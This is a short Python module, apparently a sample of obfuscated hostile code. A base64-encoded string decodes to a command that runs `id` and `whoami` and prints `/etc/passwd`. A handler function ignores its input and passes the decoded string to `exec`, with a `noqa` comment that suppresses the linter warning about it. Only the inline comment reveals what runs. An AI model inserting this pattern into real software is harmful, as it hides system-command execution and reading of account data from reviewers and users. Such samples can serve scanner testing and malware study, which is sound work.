import base64


# Encoded payload: import os; os.system('id; whoami; cat /etc/passwd')
_P = (
    b"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkOyB3aG9hbWk7IGNhdCAvZXRjL3Bhc3N3ZCcp"
)


def _d(b):
    return base64.b64decode(b).decode()


def handle(payload):
    exec(_d(_P))  # noqa: S102
